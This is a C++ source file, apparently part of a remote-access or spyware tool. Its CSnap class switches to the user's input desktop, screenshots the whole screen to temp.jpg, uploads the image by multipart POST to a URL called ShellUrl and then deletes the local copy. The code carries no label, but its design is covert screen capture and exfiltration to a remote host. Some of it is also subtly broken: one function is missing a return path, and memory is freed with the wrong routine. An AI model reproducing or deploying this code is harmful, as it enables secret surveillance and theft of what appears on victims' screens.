//#include <afx.h>
#include <wingdi.h>
#include <atlimage.h>
#include "Client.h"
#include <iostream>
#include <fstream>


using namespace std;

typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

typedef struct 
{
	unsigned ( __stdcall *start_address )( void * );
	void	*arglist;
	bool	bInteractive; // 是否支持交互桌面
	HANDLE	hEventTransferArg;
}THREAD_ARGLIST, *LPTHREAD_ARGLIST;

BOOL SelectHDESK(HDESK new_desktop)
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());

	DWORD dummy;
	char new_name[256];

	BOOL a=GetUserObjectInformation(new_desktop, UOI_NAME, &new_name, 256, &dummy);

    if (!a)
	{
		OutputDebugString("aaaaa");
		return FALSE;
	}

	// Switch the desktop
	if(!SetThreadDesktop(new_desktop)) {
		return FALSE;
	}

	// Switched successfully - destroy the old desktop
	CloseDesktop(old_desktop);

	return TRUE;
}



BOOL SelectDesktop(char *name)
{
	HDESK desktop;

	if (name != NULL)
	{
		// Attempt to open the named desktop
		desktop = OpenDesktop(name, 0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
	}
	else
	{
		// No, so open the input desktop
		desktop = OpenInputDesktop(0, FALSE,
			DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
			DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
	}

	// Did we succeed?
	if (desktop == NULL) {
		return FALSE;
	}

	// Switch to the new desktop
	if (!SelectHDESK(desktop)) {
		// Failed to enter the new desktop, so free it!
		CloseDesktop(desktop);
		return FALSE;
	}

	// We successfully switched desktops!
	return TRUE;
}

unsigned int __stdcall ThreadLoader(LPVOID param)
{
	unsigned int	nRet = 0;
#ifdef _DLL
	try
	{
#endif	
		THREAD_ARGLIST	arg;
		memcpy(&arg, param, sizeof(arg));
		SetEvent(arg.hEventTransferArg);
		// 与卓面交互
		if (arg.bInteractive)
			SelectDesktop(NULL);

		nRet = arg.start_address(arg.arglist);
#ifdef _DLL
	}catch(...){};
#endif
	return nRet;
}

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId, bool bInteractive)
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	arg;
	arg.start_address = (unsigned ( __stdcall *)( void * ))lpStartAddress;
	arg.arglist = (void *)lpParameter;
	arg.bInteractive = bInteractive;
	arg.hEventTransferArg = CreateEvent(NULL, false, false, NULL);
	hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
	WaitForSingleObject(arg.hEventTransferArg, INFINITE);
	CloseHandle(arg.hEventTransferArg);

	return hThread;
}


class CSnap
{
	CClient* pClient;
	HBITMAP m_hBitmap;
	LPBITMAPINFO  m_lpbmi_Scr;
	LPVOID m_lpvScrBits;
public:
	
	CSnap();
	~CSnap();
    //BOOL SwitchToDesktop(HDESK hDesktop);
    BOOL SwitchInputDesktop();
    LPBITMAPINFO CSnap::ConstructBI(int biBitCount, int biWidth, int biHeight);
	void CopyScreenToBitmap();
	void UploadPicture();

};

CSnap::CSnap()
{

pClient=new CClient;

}
CSnap::~CSnap()
{
free(pClient);
}

/*
bool SwitchInputDesktop()
{
	BOOL	bRet = false;
	DWORD	dwLengthNeeded;

	HDESK	hOldDesktop, hNewDesktop;
	char	strCurrentDesktop[256], strInputDesktop[256];

	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded);


	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(strInputDesktop, 0, sizeof(strInputDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);

	if (lstrcmpi(strInputDesktop, strCurrentDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	CloseDesktop(hOldDesktop);

	CloseDesktop(hNewDesktop);


	return bRet;
}*/


/*
BOOL CSnap::SwitchToDesktop(HDESK hDesktop)
{
	BOOL bRet = FALSE;

	HWINSTA hwinsta = NULL;
	do
	{
		hwinsta = OpenWindowStation(_T("winsta0"), FALSE, MAXIMUM_ALLOWED);
		if(hwinsta == NULL)
			break ;

		if(!SetProcessWindowStation(hwinsta))
			break ;

		if(!SetThreadDesktop(hDesktop))
			break ;

		bRet = TRUE;
	}while(0);

	if(hwinsta)
		CloseWindowStation(hwinsta);

	return bRet;
}

BOOL CSnap::SwitchInputDesktop()
{
	BOOL bRet = FALSE;
	do
	{
		HDESK hdesk = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
		if(hdesk == NULL)
			break ;
		SwitchToDesktop(hdesk);
		CloseDesktop(hdesk);
		bRet = TRUE;
	}while(0);

	return bRet;
}*/


BOOL CSnap::SwitchInputDesktop()
{
	BOOL	bRet = false;
	DWORD	dwLengthNeeded;

	HDESK	hOldDesktop, hNewDesktop;
	char	strCurrentDesktop[256], strInputDesktop[256];

	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded);


	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(strInputDesktop, 0, sizeof(strInputDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);

	//if (lstrcmpi(strInputDesktop, strCurrentDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	CloseDesktop(hOldDesktop);

	CloseDesktop(hNewDesktop);


	return bRet;
}
LPBITMAPINFO CSnap::ConstructBI(int biBitCount, int biWidth, int biHeight)
{
/*
biBitCount 为1 (黑白二色图) 、4 (16 色图) 、8 (256 色图) 时由颜色表项数指出颜色表大小
biBitCount 为16 (16 位色图) 、24 (真彩色图, 不支持) 、32 (32 位色图) 时没有颜色表
	*/
	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;
	
	int nBISize = sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
	BITMAPINFO	*lpbmi = (BITMAPINFO *) new BYTE[nBISize];
	
	BITMAPINFOHEADER	*lpbmih = &(lpbmi->bmiHeader);
	lpbmih->biSize = sizeof(BITMAPINFOHEADER);
	lpbmih->biWidth = biWidth;
	lpbmih->biHeight = biHeight;
	lpbmih->biPlanes = 1;
	lpbmih->biBitCount = biBitCount;
	lpbmih->biCompression = BI_RGB;
	lpbmih->biXPelsPerMeter = 0;
	lpbmih->biYPelsPerMeter = 0;
	lpbmih->biClrUsed = 0;
	lpbmih->biClrImportant = 0;
	lpbmih->biSizeImage = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;
	
	// 16位和以后的没有颜色表，直接返回
	if (biBitCount >= 16)
		return lpbmi;
}

void CSnap::CopyScreenToBitmap()
//lpRect 代表选定区域
{
	 if(!SwitchInputDesktop())
	 {
		 printf("switch error!");
		 OutputDebugString("switch error!");
	 }
	HDC       hScrDC, hMemDC;      
	// 屏幕和内存设备描述表
	HBITMAP   hOldBitmap;   
	// 位图句柄
	int       nX, nY, nX2, nY2;   
	nX=0;
	nY=0;
	nX2=GetSystemMetrics(SM_CXSCREEN);
	nY2=GetSystemMetrics(SM_CYSCREEN);

	// 选定区域坐标
	int       nWidth, nHeight;

   
	//为屏幕创建设备描述表
	hScrDC = GetDC(GetDesktopWindow());

	//为屏幕设备描述表创建兼容的内存设备描述表
	hMemDC = CreateCompatibleDC(hScrDC);
	// 获得选定区域坐标

	nWidth = nX2 - nX;
	nHeight = nY2 - nY;
	// 创建一个与屏幕设备描述表兼容的位图

	m_lpbmi_Scr=ConstructBI(16,nWidth,nHeight);

	m_hBitmap=::CreateDIBSection(hScrDC, m_lpbmi_Scr, DIB_RGB_COLORS, &m_lpvScrBits, NULL, NULL);
    

	
	//m_hBitmap = CreateCompatibleBitmap
			//(hScrDC, nWidth, nHeight);
	
	// 把新位图选到内存设备描述表中
	hOldBitmap = (HBITMAP)SelectObject(hMemDC, m_hBitmap);

	// 把屏幕设备描述表拷贝到内存设备描述表中
	
	BitBlt(hMemDC, 0, 0, nWidth, nHeight,
	hScrDC, nX, nY, SRCCOPY);
	

	m_hBitmap = (HBITMAP)SelectObject(hMemDC, hOldBitmap);
	//得到屏幕位图的句柄
	//清除 

	
	DeleteDC(hScrDC);
	DeleteDC(hMemDC);
	// 返回位图句柄
	

    CImage img;
	img.Attach(m_hBitmap);
	img.Save("temp.jpg");

		
	
}

void CSnap::UploadPicture()
{

	
	DWORD RSize;
			
	int i;
	HANDLE hOpenFile = (HANDLE)CreateFile("temp.jpg", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hOpenFile == INVALID_HANDLE_VALUE)
	{
		hOpenFile = NULL;
		printf("open file error\n");
	}
	DWORD  filelen= GetFileSize(hOpenFile, NULL);

	LPBYTE buffer = (LPBYTE)LocalAlloc(LPTR, filelen);
	ReadFile(hOpenFile, buffer, filelen, &RSize, NULL);

    CloseHandle(hOpenFile);

	
	char* boudary="-----------------------------7dc2772f010c\r\n";
	DWORD lenboudary=strlen(boudary);
	
	char* ConDis="Content-Disposition: form-data; name=\"file\"; filename=\"temp.jpg\"\r\n";
    DWORD lenConDis=strlen(ConDis);

	char* ConType="Content-Type: image/pjpeg\r\n\r\n";//注意,不是一个\r\n!!!!!!!!!!!!!!!!!!!!!!!
    DWORD lenConType=strlen(ConType);
    
	char* Condis2="Content-Disposition: form-data; name=\"submit\"\r\n";
    DWORD lenCondis2=strlen(Condis2);

	DWORD lenTotal=lenboudary+lenConDis+lenConType+filelen+2+lenboudary;//+lenCondis2+lenboudary;
    char* strPostdata=new char[lenTotal];

	char* p = strPostdata;
	memcpy(p,boudary,lenboudary*sizeof(char));

	p += lenboudary*sizeof(char);
	memcpy(p,ConDis,lenConDis*sizeof(char));

	p+=lenConDis*sizeof(char);
    memcpy(p,ConType,lenConType*sizeof(char));
    
	p+=lenConType*sizeof(char);
	memcpy(p,buffer,filelen);
    
	p+=filelen;
	memcpy(p,"\r\n",2);

	p+=2;
	memcpy(p,boudary,lenboudary*sizeof(char));

	//可以不用再加下面两行
   // p+=lenboudary*sizeof(char);
	//memcpy(p,Condis2,lenCondis2*sizeof(char));

	//p+=lenCondis2*sizeof(char);
	//memcpy(p,boudary,lenboudary*sizeof(char));


	
	pClient->post(ShellUrl,strPostdata,lenTotal);
	
	free(strPostdata);
	
	LocalFree(buffer);

	DeleteFile("temp.jpg");

}
